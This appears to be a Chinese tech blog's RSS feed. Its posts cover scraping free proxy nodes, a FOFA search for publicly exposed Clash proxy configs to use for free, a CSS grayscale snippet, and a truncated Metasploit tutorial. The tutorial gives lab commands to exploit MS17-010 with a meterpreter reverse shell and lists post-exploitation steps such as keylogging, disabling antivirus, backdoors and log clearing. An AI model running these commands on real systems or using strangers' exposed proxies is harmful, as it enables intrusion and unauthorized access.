进行节点可用性的检测</p><h3 id="2-2、爬取之前为什么需要准备个可以富强的订阅？"><a href="#2-2、爬取之前为什么需要准备个可以富强的订阅？" class="headerlink" title="2.2、爬取之前为什么需要准备个可以富强的订阅？"></a>2.2、爬取之前为什么需要准备个可以富强的订阅？</h3><p>因为你爬取的内容可能需要富强，比如github。</p><h3 id="2-3、爬取之前为什么需要退出其他代理软件？"><a href="#2-3、爬取之前为什么需要退出其他代理软件？" class="headerlink" title="2.3、爬取之前为什么需要退出其他代理软件？"></a>2.3、爬取之前为什么需要退出其他代理软件？</h3><p>为了不影响节点可用性的检测</p><h1 id="3、具体操作步骤"><a href="#3、具体操作步骤" class="headerlink" title="3、具体操作步骤"></a>3、具体操作步骤</h1><h2 id="3-1、在配置中导入预先准备的订阅，然后选中"><a href="#3-1、在配置中导入预先准备的订阅，然后选中" class="headerlink" title="3.1、在配置中导入预先准备的订阅，然后选中"></a>3.1、在配置中导入预先准备的订阅，然后选中</h2><p>如果没有可自购或者在GitHub搜索节点抓取</p><h2 id="3-2、在抓取中导入要抓取的URL地址"><a href="#3-2、在抓取中导入要抓取的URL地址" class="headerlink" title="3.2、在抓取中导入要抓取的URL地址"></a>3.2、在抓取中导入要抓取的URL地址</h2><h3 id="3-2-1-爬取源"><a href="#3-2-1-爬取源" class="headerlink" title="3.2.1 爬取源"></a>3.2.1 爬取源</h3><p><a href="https://github.com/search?q=vless&type=repositories&s=updated&o=desc">Github 免费节点 </a></p><h3 id="3-2-2-下面以这个库举例"><a href="#3-2-2-下面以这个库举例" class="headerlink" title="3.2.2 下面以这个库举例"></a>3.2.2 下面以这个库举例</h3><p><a href="https://github.com/soroushmirzaei/telegram-configs-collector">telegram-configs-collector</a><br>进入主页就可以看到订阅了</p><h3 id="3-2-3-复制订阅地址，一一将其导入抓取页面里"><a href="#3-2-3-复制订阅地址，一一将其导入抓取页面里" class="headerlink" title="3.2.3 复制订阅地址，一一将其导入抓取页面里"></a>3.2.3 复制订阅地址，一一将其导入抓取页面里</h3><p>抓取类型选择fuzzy模糊抓取，导入完毕点击抓取，等待5分钟</p><h2 id="3-3、抓取完成进入筛选页面"><a href="#3-3、抓取完成进入筛选页面" class="headerlink" title="3.3、抓取完成进入筛选页面"></a>3.3、抓取完成进入筛选页面</h2><p>就是点击右上角那个小漏斗图标<br>然后你可以根据你喜欢的协议类型、国家地区进行筛选了</p><h2 id="3-4、节点的使用"><a href="#3-4、节点的使用" class="headerlink" title="3.4、节点的使用"></a>3.4、节点的使用</h2><h3 id="3-4-1-导出使用"><a href="#3-4-1-导出使用" class="headerlink" title="3.4.1 导出使用"></a>3.4.1 导出使用</h3><p>点击 <strong>导出配置</strong>，就会在浏览器中下载可用的节点配置<br>文件名为 Pandora-Box-Share.yaml<br>这样你就可以导入到你喜欢的代理工具中了</p><h3 id="3-4-2-生成新配置"><a href="#3-4-2-生成新配置" class="headerlink" title="3.4.2 生成新配置"></a>3.4.2 生成新配置</h3><p>点击 <strong>生成新配置</strong>，就会在配置页面到一个以Filter开头的配置文件，可以选中使用</p><h2 id="3-5、如何获取大量高质量节点"><a href="#3-5、如何获取大量高质量节点" class="headerlink" title="3.5、如何获取大量高质量节点"></a>3.5、如何获取大量高质量节点</h2><ul><li>多使用搜索，导入多一些的爬取地址，量变引起质变</li><li>靠某些tg群组分享</li></ul>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E8%BD%AF%E4%BB%B6/">软件</category>
      
      <category domain="https://zerospace.dev/tags/%E9%9A%90%E7%A7%81/">隐私</category>
      
      
      <comments>https://zerospace.dev/posts/2cb65d91/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>真实地址生成器</title>
      <link>https://zerospace.dev/posts/bd6584e8/</link>
      <guid>https://zerospace.dev/posts/bd6584e8/</guid>
      <pubDate>Thu, 31 Oct 2024 13:21:52 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;更现代化的地址生成器&lt;/p&gt;
&lt;h1 id=&quot;访问地址&quot;&gt;&lt;a href=&quot;#访问地址&quot; class=&quot;headerlink&quot; title=</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>更现代化的地址生成器</p><h1 id="访问地址"><a href="#访问地址" class="headerlink" title="访问地址"></a>访问地址</h1><p>已经部署在大善人cloudflare上了，方便各位使用</p><p><strong><a href="https://address.zerospace.dev/">基于IP的真实地址生成器 </a></strong></p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E8%BD%AF%E4%BB%B6/">软件</category>
      
      <category domain="https://zerospace.dev/tags/%E9%9A%90%E7%A7%81/">隐私</category>
      
      
      <comments>https://zerospace.dev/posts/bd6584e8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>利用佛法白嫖订阅</title>
      <link>https://zerospace.dev/posts/a2051f3/</link>
      <guid>https://zerospace.dev/posts/a2051f3/</guid>
      <pubDate>Sat, 26 Oct 2024 14:12:44 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;首先佛法地址&quot;&gt;&lt;a href=&quot;#首先佛法地址&quot; class=&quot;headerlink&quot; title=&quot;首先佛法地址&quot;&gt;&lt;/a&gt;首先佛法地址&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://fofa.info/&quot;&gt;FOFA&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;查询语法</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="首先佛法地址"><a href="#首先佛法地址" class="headerlink" title="首先佛法地址"></a>首先佛法地址</h2><p><a href="https://fofa.info/">FOFA</a></p><h2 id="查询语法"><a href="#查询语法" class="headerlink" title="查询语法"></a>查询语法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body=<span class="string">&quot;port: 7890&quot;</span> &amp;&amp; body=<span class="string">&quot;socks-port: 7891&quot;</span> &amp;&amp; body=<span class="string">&quot;allow-lan: true&quot;</span></span><br></pre></td></tr></table></figure><h2 id="搜到后就可以导入到软件咯"><a href="#搜到后就可以导入到软件咯" class="headerlink" title="搜到后就可以导入到软件咯"></a>搜到后就可以导入到软件咯</h2>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://zerospace.dev/tags/%E9%9A%90%E7%A7%81/">隐私</category>
      
      
      <comments>https://zerospace.dev/posts/a2051f3/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>一段代码将网站变为黑白</title>
      <link>https://zerospace.dev/posts/81f7fcf1/</link>
      <guid>https://zerospace.dev/posts/81f7fcf1/</guid>
      <pubDate>Fri, 25 Oct 2024 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;本教程理论上适用于所有网页&quot;&gt;&lt;a href=&quot;#本教程理论上适用于所有网页&quot; class=&quot;headerlink&quot; title=&quot;本教程理论上适用于所有网页&quot;&gt;&lt;/a&gt;本教程理论上适用于所有网页&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;最终效果在此省略&lt;/p&gt;
</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="本教程理论上适用于所有网页"><a href="#本教程理论上适用于所有网页" class="headerlink" title="本教程理论上适用于所有网页"></a>本教程理论上适用于所有网页</h2><blockquote><p>最终效果在此省略</p></blockquote><p>在网页的 <code>&lt;/head&gt;</code> 前添加以下代码<br>若想要全站变为黑白，可修改 <code>head.ejs</code> 模板文件（不同主题略有不同）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">html &#123;</span><br><span class="line">    filter: progid:DXImageTransform.Microsoft.BasicImage(grayscale=1);</span><br><span class="line">    -webkit-filter: grayscale(100%);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E5%BC%80%E5%8F%91/">开发</category>
      
      <category domain="https://zerospace.dev/tags/%E5%89%8D%E7%AB%AF/">前端</category>
      
      
      <comments>https://zerospace.dev/posts/81f7fcf1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>MSF使用教程</title>
      <link>https://zerospace.dev/posts/2f26ee9c/</link>
      <guid>https://zerospace.dev/posts/2f26ee9c/</guid>
      <pubDate>Thu, 24 Oct 2024 13:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Metasploit-Framework&quot;&gt;&lt;a href=&quot;#Metasploit-Framework&quot; class=&quot;headerlink&quot; title=&quot;Metasploit Framework&quot;&gt;&lt;/a&gt;Metasploit Framework&lt;/h1&gt;&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a>Metasploit Framework</h1><ul><li>实验环境</li><li>简介</li><li>Metasploit 的安装和更新升级<ol><li>一键安装MSF</li><li>MSF 的更新升级<ol><li>非 kali 环境下更新升级 MSF</li><li>kali 环境下更新升级 MSF</li></ol></li></ol></li><li>使用方法<ol><li>基础使用</li><li><code>MSF</code> 中加载自定义的 <code>exploit 模块</code></li><li>漏洞利用 (exploit)</li><li>攻击载荷 (payload)<br>4.1 payload 模块路径<br>4.2 Metasploit 中的 Payload 模块主要有以下三种类型</li><li>Meterpreter<br>5.1 Meterpreter 是如何工作的？<br>5.2 Meterpreter 的特点</li><li>MS17_010 (永恒之蓝)<br>6.1 查找漏洞相关模块<br>6.2 利用 <code>Auxiliary 辅助探测模块</code> 对漏洞进行探测<br>6.3 使用 <code>Exploit 漏洞利用模块</code> 对漏洞进行利用<br>6.4 Payload 攻击载荷模块</li><li>后渗透阶段<br>7.1 Post 后渗透模块<br>7.2 查看主机是否运行在虚拟机上<br>7.3 关闭杀毒软件<br>7.4 获取目标主机的详细信息<br>7.5 访问文件系统<br>7.6 上传 &#x2F; 下载文件<br>7.6.1 下载文件<br>7.6.2 上传文件<br>7.7 权限提升<br>7.8 获取用户密码<br>7.9 运行程序<br>7.11 屏幕截图<br>7.12 创建一个新账号<br>7.13 启用远程桌面<br>7.14 键盘记录<br>7.15 进程迁移<br>7.16 禁止目标主机使用键盘鼠标<br>7.17 用目标主机摄像头拍照<br>7.18 常用扩展库介绍<br>7.18.1 load&#x2F;use 命令<br>7.18.2 run 命令<br>7.19 生成持续性后门<br>7.19.1 启动项启动<br>7.19.2 服务启动<br>7.20 portfwd 端口转发<br>7.21 清除事件日志</li><li>导入并执行 PowerShell 脚本</li><li>加载 stdapi</li><li>升级 Session</li></ol></li></ul><hr><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote><p>靶机<br>Windows10<br>192.168.100.158</p></blockquote><blockquote><p>攻击机<br>Linux Kali<br>192.168.100.132</p></blockquote><hr><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Metasploit Framework(MSF) 是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新<br>Metasploit 可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程<br>被安全社区冠以 “可以黑掉整个宇宙” 之名<br>刚开始的 Metasploit 是采用 Perl 语言编写的，但是再后来的新版中，改成了用 Ruby 语言编写<br>在 kali 中，自带了 Metasploit 工具<br>我们接下来以大名鼎鼎的永恒之蓝 MS17_010 漏洞为切入点，讲解 MSF 框架的使用</p><hr><h2 id="Metasploit-的安装和更新升级"><a href="#Metasploit-的安装和更新升级" class="headerlink" title="Metasploit 的安装和更新升级"></a>Metasploit 的安装和更新升级</h2><h3 id="一键安装-MSF"><a href="#一键安装-MSF" class="headerlink" title="一键安装 MSF"></a>一键安装 MSF</h3><blockquote><p>在一般的 linux 中，默认是不安装 MSF 的<br>以下是在非 kali 的 Linux 下安装 MSF 框架</p></blockquote><p>所需命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一键安装MSF：</span></span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; <span class="built_in">chmod</span> 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"> </span><br><span class="line">adduser msf                           <span class="comment">#添加msf用户</span></span><br><span class="line">su msf                                <span class="comment">#切换到msf用户</span></span><br><span class="line"><span class="built_in">cd</span>  /opt/metasploit-framework/bin     <span class="comment">#切换到msf所在的目录</span></span><br><span class="line">./msfconsole                          <span class="comment">#以后启动msfconsole，都切换到msf用户下启动，这样会同步数据库。如果使用root用户启动的话，不会同步数据库</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#也可以将msfconsole加入到执行目录下，这样在任何目录直接msfconsole就可以了</span></span><br><span class="line"><span class="built_in">ln</span> -s /opt/metasploit-framework/bin/msfconsole /usr/bin/msfconsole</span><br><span class="line"> </span><br><span class="line"><span class="comment">#备注：</span></span><br><span class="line"><span class="comment">#初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联</span></span><br><span class="line"><span class="comment">#这也这也就是需要新建用户msf来运行metasploit的原因所在</span></span><br><span class="line"><span class="comment">#如果你一不小心手一抖，初次运行是在root用户下</span></span><br><span class="line"><span class="comment">#请使用 msfdb reinit 命令，然后使用非root用户初始化数据库   </span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 非kali环境下更新升级MSF：</span></span><br><span class="line">msfupdate   <span class="comment"># MSF后期的升级</span></span><br><span class="line"><span class="comment"># kali环境下更新升级MSF：</span></span><br><span class="line">apt update    <span class="comment"># 更新安装包信息；只检查，不更新（已安装的软件包是否有可用的更新，给出汇总报告）</span></span><br><span class="line">apt upgrade    <span class="comment"># 更新已安装的软件包，不删除旧包</span></span><br><span class="line">apt full-upgrade   <span class="comment"># 升级包，删除旧包</span></span><br></pre></td></tr></table></figure><hr><h3 id="MSF-的更新升级"><a href="#MSF-的更新升级" class="headerlink" title="MSF 的更新升级"></a>MSF 的更新升级</h3><h4 id="非-kali-环境下更新升级-MSF"><a href="#非-kali-环境下更新升级-MSF" class="headerlink" title="非 kali 环境下更新升级 MSF"></a>非 kali 环境下更新升级 MSF</h4><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfupdate  <span class="comment">#MSF后期更新升级</span></span><br></pre></td></tr></table></figure><h4 id="kali-环境下更新升级-MSF"><a href="#kali-环境下更新升级-MSF" class="headerlink" title="kali 环境下更新升级 MSF"></a>kali 环境下更新升级 MSF</h4><blockquote><p>由于 kali 中的 Metasploit 渗透测试框架是集成在系统中的<br>不是单独安装，不支持使用 msfupdate 命令更新<br>更新的话需要随系统程序更新</p></blockquote><p>使用 msfupdate 命令会出现下面的情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/desktop]</span><br><span class="line">└─# msfupdate</span><br><span class="line">msfupdate is no longer supported when Metasploit is part of the operating</span><br><span class="line">system. Please use <span class="string">&#x27;apt update; apt install metasploit-framework&#x27;</span></span><br></pre></td></tr></table></figure><p>在 kali 中更新 MSF 使用以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt update <span class="comment"># 更新安装包信息；只检查，不更新（已安装的软件包是否有可用的更新，给出汇总报告）</span></span><br><span class="line">apt upgrade <span class="comment"># 更新已安装的软件包，不删除旧包；</span></span><br><span class="line">apt full-upgrade<span class="comment"># 升级包，删除旧包</span></span><br></pre></td></tr></table></figure><p>使用上面命令，是在更新系统程序的同时，把 MSF 更新</p><hr><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole    <span class="comment">#进入框架</span></span><br><span class="line">search  ms17_010                                    <span class="comment"># 使用search命令查找相关漏洞</span></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue        <span class="comment"># 使用use进入模块</span></span><br><span class="line">info         <span class="comment">#使用info查看模块信息</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp    <span class="comment">#设置攻击载荷</span></span><br><span class="line">show options    <span class="comment">#查看模块需要配置的参数</span></span><br><span class="line"><span class="built_in">set</span>  RHOST  192.168.100.158        <span class="comment">#设置参数</span></span><br><span class="line">exploit / run         <span class="comment">#攻击</span></span><br></pre></td></tr></table></figure><hr><h3 id="MSF-中加载自定义的-exploit模块"><a href="#MSF-中加载自定义的-exploit模块" class="headerlink" title="MSF 中加载自定义的 exploit模块"></a><code>MSF</code> 中加载自定义的 <code>exploit模块</code></h3><p><a href="https://blog.csdn.net/weixin_45588247/article/details/119488520?spm=1001.2014.3001.5501" title="CVE-2019-0708 远程桌面漏洞复现">参考CSDN-CVE-2019-0708 远程桌面漏洞复现</a></p><hr><h3 id="漏洞利用-exploit"><a href="#漏洞利用-exploit" class="headerlink" title="漏洞利用 (exploit)"></a>漏洞利用 (exploit)</h3><blockquote><p>漏洞利用 exploit，也就是我们常说的 exp<br>他就是对漏洞进行攻击的代码</p></blockquote><p>exploit 漏洞利用模块路径 (这里面有针对不同平台的 exploit)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/exploits</span><br></pre></td></tr></table></figure><hr><h3 id="攻击载荷-payload"><a href="#攻击载荷-payload" class="headerlink" title="攻击载荷 (payload)"></a>攻击载荷 (payload)</h3><p><strong>Payload</strong></p><blockquote><p><code>Payload</code> 中包含攻击进入目标主机后需要在远程系统中运行的恶意代码<br>而在 <code>Metasploit</code> 中 <code>Payload</code> 是一种特殊模块<br>它们能够以漏洞利用模块运行<br>并能够利用目标系统中的安全漏洞实施攻击<br>简而言之，这种漏洞利用模块可以访问目标系统<br>而其中的代码定义了 <code>Payload</code> 在目标系统中的行为</p></blockquote><p><strong>Shellcode</strong></p><blockquote><p><code>Shellcode</code> 是 <code>payload</code> 中的精髓部分<br>在渗透攻击时作为攻击载荷运行的一组机器指令<br><code>Shellcode</code> 通常用汇编语言编写<br>在大多数情况下，目标系统执行了 <code>shellcode</code>这一组指令之后<br>才会提供一个命令行 <code>shell</code></p></blockquote><h4 id="payload-模块路径"><a href="#payload-模块路径" class="headerlink" title="payload 模块路径"></a>payload 模块路径</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/payloads</span><br></pre></td></tr></table></figure><h4 id="Metasploit-中的-Payload-模块主要有以下三种类型"><a href="#Metasploit-中的-Payload-模块主要有以下三种类型" class="headerlink" title="Metasploit 中的 Payload 模块主要有以下三种类型"></a>Metasploit 中的 Payload 模块主要有以下三种类型</h4><p><strong>Single</strong>：</p><blockquote><p>是一种完全独立的 <code>Payload</code>，而且使用起来就像运行 <code>calc.exe</code> 一样简单<br>例如添加一个系统用户或删除一份文件。由于 <code>Single Payload</code> 是完全独立的，因此它们有可能会被类似 <code>netcat</code> 这样的非 <code>metasploit</code> 处理工具所捕捉到</p></blockquote><p><strong>Stager</strong>：</p><blockquote><p>这种 <code>Payload 负责建立目标用户与攻击者之间的网络连接</code>，并下载额外的组件或应用程序<br>一种常见的 <code>Stager Payload</code> 就是 <code>reverse_tcp</code>，它<code>可以让目标系统与攻击者建立一条 tcp 连接</code>，让目标系统主动连接我们的端口 (反向连接)<br>另一种常见的是 <code>bind_tcp</code>，它可以<code>让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)</code></p></blockquote><p><strong>Stage</strong>：</p><blockquote><p>是 <code>Stager Payload</code> 下的一种 <code>Payload组件</code><br>这种 Payload 可以提供更加高级的功能，而且没有大小限制</p></blockquote><p>在 Metasploit 中，我们可以通过 Payload 的名称和使用格式来推断它的类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Single Payload的格式为：</span></span><br><span class="line">&lt;target&gt;/ &lt;single&gt;  如：windows/powershell_bind_tcp</span><br><span class="line"><span class="comment">#Stager/Stage Payload的格式为：</span></span><br><span class="line">&lt;target&gt;/ &lt;stage&gt; / &lt;stager&gt;  如：windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><ul><li>当我们在 Metasploit 中执行 show payloads 命令之后，它会给我们显示一个可使用的 Payload 列表</li></ul><blockquote><p>在这个列表中，像 <code>windows/powershell_bind_tcp</code> 就是一个 <code>Single Payload</code>，它不包含 <code>Stage Payload</code><br>而 <code>windows/meterpreter/reverse_tcp</code> 则由一个 <code>Stage Payload (meterpreter)</code>和 一个 <code>Stager Payload (reverse_tcp)</code> 组成</p></blockquote><p>Stager 中几种常见的 payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows/meterpreter/bind_tcp       <span class="comment">#正向连接</span></span><br><span class="line">windows/meterpreter/reverse_tcp    <span class="comment">#反向连接，常用</span></span><br><span class="line">windows/meterpreter/reverse_http   <span class="comment">#通过监听80端口反向连接</span></span><br><span class="line">windows/meterpreter/reverse_https  <span class="comment">#通过监听443端口反向连接</span></span><br></pre></td></tr></table></figure><ul><li><p>正向连接使用场景</p><blockquote><p>我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了<br>但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了 80 端口<br>那么，我们就只能设置正向连接 80 端口了，这里很有可能失败，因为 80 端口上的流量太多了</p></blockquote></li><li><p>反向连接使用场景</p><blockquote><p>我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了<br>如果是这样的情况，建议使用反向连接<br>因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量</p></blockquote></li><li><p>反向连接80和443端口使用场景</p><blockquote><p>被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置的特别严格<br>就连被攻击机访问外部网络的流量也进行了严格的限制<br>只允许被攻击机的 80 端口或 443 端口与外部通信</p></blockquote></li></ul><hr><h3 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h3><blockquote><p><code>Meterpreter</code> 属于 <code>stage payload</code><br>在 <code>Metasploit Framework</code> 中，<code>Meterpreter</code> 是一种<code>后渗透工具</code><br>它属于一种在运行过程中可通过网络进行功能扩展的<code>动态可扩展型 Payload</code><br>这种工具是基于 <code>内存 DLL 注入</code> 理念实现的<br>它能够通过创建一个<code>新进程并调用注入的 DLL</code> 来让<code>目标系统运行注入的 DLL文件</code></p></blockquote><h4 id="Meterpreter-是如何工作的？"><a href="#Meterpreter-是如何工作的？" class="headerlink" title="Meterpreter 是如何工作的？"></a>Meterpreter 是如何工作的？</h4><blockquote><p>首先目标先要执行初始的溢出漏洞会话连接，可能是 <code>bind 正向连接</code>，或者<code>反弹 reverse 连接</code><br>反射连接的时候<code>加载 dll 链接文件</code>，同时<code>后台悄悄处理 dll 文件</code><br>其次 <code>Meterpreter</code> 核心代码初始化，通过 <code>socket 套接字</code>建立一个 <code>TLS/1.0</code> 加密隧道并发送 <code>GET 请求</code> 给 <code>Metasploit 服务端</code><br><code>Metasploit 服务端</code>收到这个 <code>GET</code> 请求后就配置相应客户端<br>最后，<code>Meterpreter</code> 加载扩展，所有的扩展被加载都通过 <code>TLS/1.0</code> 进行数据传输</p></blockquote><h4 id="Meterpreter-的特点"><a href="#Meterpreter-的特点" class="headerlink" title="Meterpreter 的特点"></a>Meterpreter 的特点</h4><ul><li><code>Meterpreter</code> 完全驻留在内存，没有写入到磁盘。</li><li><code>Meterpreter</code> 注入的时候不会产生新的进程，并可以很容易的移植到其它正在运行的进程。</li><li>默认情况下， <code>Meterpreter</code> 的通信是加密的，所以很安全。</li><li>扩展性，许多新的特征模块可以被加载。</li></ul><p>我们在设置 <code>payloads</code> 时，可以将 <code>payloads</code> 设置为：<code>windows/meterpreter/reverse_tcp</code><br>然后获得了 <code>meterpreter&gt;</code> 之后我们就可以干很多事了</p><hr><h3 id="MS17-010-永恒之蓝"><a href="#MS17-010-永恒之蓝" class="headerlink" title="MS17_010 (永恒之蓝)"></a>MS17_010 (永恒之蓝)</h3><blockquote><p>我们现在模拟使用 MS17_010 漏洞攻击<br>这个漏洞就是去年危害全球的勒索病毒利用的永恒之蓝漏洞</p></blockquote><h4 id="查找漏洞相关模块"><a href="#查找漏洞相关模块" class="headerlink" title="查找漏洞相关模块"></a>查找漏洞相关模块</h4><ol><li><p>在 kali 命令行里面输入命令 msfconsole，进入 msf 框架中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  <span class="comment">#输入命令进入msf渗透框架中</span></span><br></pre></td></tr></table></figure></li><li><p>搜索 MS17_010 漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010  <span class="comment">#利用search命令，搜索漏洞相关利用模块</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="利用-Auxiliary辅助探测模块-对漏洞进行探测"><a href="#利用-Auxiliary辅助探测模块-对漏洞进行探测" class="headerlink" title="利用 Auxiliary辅助探测模块 对漏洞进行探测"></a>利用 <code>Auxiliary辅助探测模块</code> 对漏洞进行探测</h4><p><strong>Auxiliary辅助探测模块</strong></p><blockquote><p>该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试</p></blockquote><ol><li><p>使用 smb_ms17_010 漏洞探测模块对 smb_ms17_010 漏洞进行探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure></li><li><p>查看这个模块需要配置的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options  <span class="comment">#查看这个模块需要配置的信息</span></span><br></pre></td></tr></table></figure></li><li><p>设置要探测的远程目标</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.100.100-192.168.100.190</span><br></pre></td></tr></table></figure></li><li><p>对上面设置的 ip 范围内的主机进行攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ol><h4 id="使用-Exploit漏洞利用模块-对漏洞进行利用"><a href="#使用-Exploit漏洞利用模块-对漏洞进行利用" class="headerlink" title="使用 Exploit漏洞利用模块 对漏洞进行利用"></a>使用 <code>Exploit漏洞利用模块</code> 对漏洞进行利用</h4><ol><li><p>选择漏洞攻击模块，对漏洞进行利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure></li><li><p>查看这个漏洞的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info</span><br></pre></td></tr></table></figure></li><li><p>查看可攻击的系统平台，显示当前攻击模块针对哪些特定操作系统版本、语言版本的系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show targets  </span><br></pre></td></tr></table></figure></li></ol><h4 id="Payload-攻击载荷模块"><a href="#Payload-攻击载荷模块" class="headerlink" title="Payload 攻击载荷模块"></a>Payload 攻击载荷模块</h4><blockquote><p>攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码<br>成功渗透目标后，用于在目标系统上运行任意命令</p></blockquote><ol><li><p>查看攻击载荷</p><figure class="highlight bash"><table><tr><td 